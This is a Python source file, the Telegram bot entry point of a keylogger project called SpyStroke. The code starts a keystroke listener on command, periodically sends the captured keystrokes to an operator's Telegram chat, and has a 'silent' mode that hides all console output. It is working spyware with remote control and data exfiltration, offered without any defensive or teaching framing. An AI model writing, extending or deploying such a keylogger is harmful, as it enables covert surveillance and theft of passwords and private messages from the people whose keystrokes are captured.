"""SpyStroke — Telegram bot entry point.

Run with ``python bot.py`` from this directory or ``python telegram/bot.py``
from the repository root.

Commands:
    /start       Show help
    /key_logger  Start capturing keystrokes and reporting them
    /stop        Stop capturing (bot stays online)
    /status      Show whether the keylogger is running
    /exit        Stop everything and shut the bot down

Configuration comes from environment variables — see ``spystroke.config``.
"""

from __future__ import annotations

import asyncio
import logging
import os
import sys
from typing import Optional

# Make the shared package importable regardless of the working directory
# (e.g. ``cd telegram && python bot.py``).
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from telegram import Update  # noqa: E402
from telegram.ext import Application, ApplicationBuilder, CommandHandler, ContextTypes  # noqa: E402

from spystroke.config import TelegramConfig, load_telegram_config  # noqa: E402
from spystroke.core import KeyListener  # noqa: E402
from spystroke.telegram_reporter import TelegramReporter  # noqa: E402

logger = logging.getLogger(__name__)

HELP_TEXT = (
    "SpyStroke is online.\n\n"
    "/key_logger - Start the keylogger\n"
    "/stop - Stop the keylogger\n"
    "/status - Check keylogger status\n"
    "/exit - Shut down\n"
)


def _configure_logging(config: TelegramConfig) -> None:
    """Set up logging; optionally silence console output and log to a file."""
    handlers: list[logging.Handler] = []
    if config.log_file:
        handlers.append(logging.FileHandler(config.log_file, encoding="utf-8"))
    if not config.silent:
        handlers.append(logging.StreamHandler())

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=handlers or None,
    )
    # Suppress noisy third-party debug chatter.
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("telegram").setLevel(logging.WARNING)

    if config.silent:
        # Suppress console output entirely (redirect to devnull) but keep
        # logging working through the configured handlers.
        sys.stdout = open(os.devnull, "w")
        sys.stderr = open(os.devnull, "w")


class SpyStrokeBot:
    """Wires the keylogger, the reporter and the Telegram bot together."""

    def __init__(self, config: TelegramConfig) -> None:
        self.config = config
        self.listener = KeyListener()
        self.reporter = TelegramReporter(
            bot_token=config.bot_token, chat_id=config.chat_id
        )
        self._reporter_task: Optional[asyncio.Task] = None

    # -- lifecycle ----------------------------------------------------------

    async def _start_logging(self) -> bool:
        """Start capturing keystrokes. Returns True if newly started."""
        if self.listener.running:
            return False
        if not self.listener.start():
            return False
        self._reporter_task = asyncio.create_task(self._report_loop())
        return True

    async def _stop_logging(self) -> None:
        """Stop capturing keystrokes and cancel the reporter task."""
        if self._reporter_task is not None:
            self._reporter_task.cancel()
            try:
                await self._reporter_task
            except asyncio.CancelledError:
                pass
            self._reporter_task = None
        self.listener.stop()

    async def _report_loop(self) -> None:
        """Drain the buffer on a fixed interval and deliver the logs."""
        while True:
            await asyncio.sleep(self.config.interval)
            text = self.listener.buffer.drain()
            if text:
                try:
                    await self.reporter.send(text)
                except Exception:
                    # Never let a delivery error kill the reporting loop.
                    logger.exception("Failed to deliver keystroke log")

    # -- bot commands -------------------------------------------------------

    async def _cmd_start(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        await update.message.reply_text(HELP_TEXT)

    async def _cmd_key_logger(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        if self.listener.running:
            await update.message.reply_text("Keylogger is already running.")
            return
        if not await self._start_logging():
            await update.message.reply_text("Failed to start the keylogger.")
            return
        await update.message.reply_text("Keylogger started!")

    async def _cmd_stop(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        await self._stop_logging()
        await update.message.reply_text("Keylogger stopped. Bot is still online.")

    async def _cmd_status(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        state = "running" if self.listener.running else "stopped"
        buffered = self.listener.buffer.size
        await update.message.reply_text(
            f"Keylogger is {state}. Buffered characters: {buffered}."
        )

    async def _cmd_exit(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        await update.message.reply_text("Shutting down...")
        await self._stop_logging()
        await self.reporter.aclose()
        # Stop the application from within the handler.
        context.application.stop_running()

    # -- entry --------------------------------------------------------------

    async def run(self) -> None:
        """Build the application and poll for updates until stopped."""
        app = ApplicationBuilder().token(self.config.bot_token).build()
        app.add_handler(CommandHandler("start", self._cmd_start))
        app.add_handler(CommandHandler("key_logger", self._cmd_key_logger))
        app.add_handler(CommandHandler("stop", self._cmd_stop))
        app.add_handler(CommandHandler("status", self._cmd_status))
        app.add_handler(CommandHandler("exit", self._cmd_exit))

        try:
            await app.run_polling()
        finally:
            # run_polling returns after stop_running() or Ctrl+C; make sure
            # the listener and reporter are always cleaned up.
            await self._stop_logging()
            await self.reporter.aclose()


def main() -> None:
    config = load_telegram_config()
    config.validate()
    _configure_logging(config)

    bot = SpyStrokeBot(config)
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Interrupted, shutting down")
    except Exception:
        logger.exception("Fatal error")
        sys.exit(1)


if __name__ == "__main__":
    main()
